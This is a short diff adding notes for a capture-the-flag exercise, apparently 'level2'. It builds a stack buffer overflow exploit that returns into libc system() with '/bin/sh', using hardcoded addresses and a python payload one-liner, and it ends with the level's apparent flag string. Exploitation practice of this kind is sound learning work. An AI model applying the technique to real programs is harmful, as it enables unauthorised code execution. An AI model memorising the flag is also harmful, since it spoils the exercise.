@@ -1,0 +1,27 @@
+
+in gdb level2
+
+b p
+r
+
+info frame (p function)
+
+eip at 0xbffff6ac
+
+1st approach
+
+	=> need to input 0xbffff6ac - 0xbffff65c = 80 characters to get to the pushed eip
+
+	get to save of eip =>
+		replace eip by 0x0804853e (p + 106 ret) as the new pushed eip
+		replace eip + 4 by 0xb7e6b060 (system) as the second pushed eip
+
+		replace eip + 8 by 0xb7e5ebe0 (exit) as the second pushed eip return value (or dummy address)
+
+		replace eip + 12 by /bin/sh from exported env
+
+
+python -c "print 'a' * 80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\xab\xf8\xff\xbf'" > /tmp/file
+	
+
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
